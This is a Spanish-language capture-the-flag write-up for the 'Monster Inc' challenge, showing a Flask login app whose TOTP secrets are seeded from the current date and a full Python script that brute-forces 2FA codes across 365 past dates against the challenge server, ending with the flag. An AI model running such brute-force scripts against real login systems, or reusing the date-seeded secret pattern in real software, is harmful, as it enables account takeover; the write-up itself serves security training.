# Reto - Monster Inc

El reto contaba con la siguiente descripción: Desde principios de este año, estamos recibiendo informes sobre actividades sospechosas provenientes de una empresa llamada Monster Inc. Nuestro equipo azul ha rastreado el portal secreto de su empresa y ha descifrado la contraseña de la cuenta de administrador: el administrador, sin embargo, no pudo eludir la seguridad de 2FA. ¿Puedes entrar? http://45.164.23.212:3000/ . Además adjuntaba un fichero **app.py** con el siguiente codigo:
```
random.seed(datetime.datetime.today().strftime('%m-%d-%Y'))

app = Flask(__name__)

@app.get('/')
def index():
    return render_template('index.html')

@app.post('/')
def log_in():
    with sqlite3.connect('monster-inc.db') as db:
        result = db.cursor().execute(
            'SELECT totp_secret FROM user WHERE username = ? AND password = ?',
            (request.form['username'], request.form['password'])
        ).fetchone()

    if result == None:
        return render_template('portal.html', message='Invalid username/password.')

    totp = pyotp.TOTP(result[0])

    if totp.verify(request.form['totp']):
        with open('../flag.txt') as file:
            return render_template('portal.html', message=file.read())

    return render_template('portal.html', message='2FA code is incorrect.')

with sqlite3.connect('monster-inc.db') as db:
    db.cursor().execute('''CREATE TABLE IF NOT EXISTS user (
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        totp_secret TEXT NOT NULL
    )''')
    db.commit()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        secret_alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567abcdef'

        totp_secret = ''.join([random.choice(secret_alpha) for _ in range(40)])

        with sqlite3.connect('monster-inc.db') as db:
            db.cursor().execute('''INSERT INTO user (
                username,
                password,
                totp_secret
            ) VALUES (?, ?, ?)''', (sys.argv[1], sys.argv[2], totp_secret))
            db.commit()

        print('Created user:')
        print('Username:\t' + sys.argv[1])
        print('Password:\t' + sys.argv[2])
        print('TOTP Secret:\t' + totp_secret)

        exit(0)

    app.run()
```
Al analizar el fichero adjunto obtuvimos información de interés:
- El archivo **app.py** recibe un username y password desde un formulario. Luego consulta una base de datos SQLite (monster-inc.db) para obtener el campo totp_secret del usuario correspondiente.
- Se genera un código temporal basado en el totp_secret almacenado en la base de datos y se verifica el código ingresado por el usuario usando la librería pyotp.
- La semilla de totp_secret se genera con un random.seed() dependiente de la fecha actual (datetime.datetime.today().strftime('%m-%d-%Y')), lo que podría permitir generar la misma secuencia de números si se conoce la fecha de creación del usuario.
- Si se logra una autenticación exitosa, la aplicación lee el archivo flag.txt en el servidor.

Accedemos a la url proporcionada y observamos que el formulario del login cuenta con 3 campos: username, password y 2FA code

<p align="center"> <img src="../../img_MetaRed Mexico Anuies-TIC 2024/retoMonster_Inc-1.png" /> </p>

Con la información obtenida a partir del análisis del fichero adjunto, creamos un script que implementa un ataque de fuerza bruta al servidor probando múltiples fechas en el pasado (365 días) y diversas ventanas de tiempo (±30 segundos) para generar posibles códigos TOTP y enviarlos al servidor a través de una petición POST. Si la respuesta del servidor no contiene errores, asume que el TOTP ha sido correcto y detiene el proceso. El código se muestra a continuación:
```
import pyotp
import datetime
import random
import requests

# Genera TOTP secret basado en una fecha específica
def generate_totp_secret(date):
    random.seed(date.strftime('%m-%d-%Y'))
    secret_alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567abcdef'
    return ''.join([random.choice(secret_alpha) for _ in range(40)])

# Prueba múltiples fechas y ventanas de tiempo para el TOTP
def try_totp_for_dates(days_back=7, time_window=2):
    url = "http://45.164.23.212:3000/"
    today = datetime.datetime.today()

    for i in range(days_back):
        # Intentar con varias fechas anteriores
        date_to_try = today - datetime.timedelta(days=i)
        totp_secret = generate_totp_secret(date_to_try)
        totp = pyotp.TOTP(totp_secret)

        # Probar con la ventana temporal (actual, anterior, y siguiente)
        for j in range(-time_window, time_window + 1):
            current_totp = totp.at(datetime.datetime.now() + datetime.timedelta(seconds=j * 30))
            
            # Imprimir información de depuración
            print(f"Date: {date_to_try.strftime('%m-%d-%Y')}, TOTP: {current_totp}")
            
            # Enviar petición POST con credenciales y código TOTP generado
            data = {
                'username': 'admin',
                'password': 'admin',
                'totp': current_totp
            }
            
            # Intentar autenticarse
            response = requests.post(url, data=data)
            
            # Verificar si el intento fue exitoso
            if "2FA code is incorrect" not in response.text:
                print(f"Success! TOTP worked for date: {date_to_try.strftime('%m-%d-%Y')}, Window: {j * 30} seconds")
                print(response.text)
                return
            else:
                print(f"2FA code is incorrect for date: {date_to_try.strftime('%m-%d-%Y')}, Window: {j * 30} seconds")
    
    print("No valid TOTP found for the past", days_back, "days.")

# Probar los últimos 365 días y una ventana temporal de +/- 30 segundos
try_totp_for_dates(days_back=365, time_window=1)
```

Para la ejecución del script se necesita instalar las librerías pyotp y requests. Ver comando debajo:
```
pip install pyotp
pip install requests
```

Posteriormente de ejecutar el script, encuentra la código 2FA y realizar la petición al servidor, se devuelve por consola la flag:

<p align="center"> <img src="../../img_MetaRed Mexico Anuies-TIC 2024/retoMonster_Inc-2.jpg" /> </p>

**Flag del reto:** ```flagmx{time_based_pass_r_not_realy_random}```
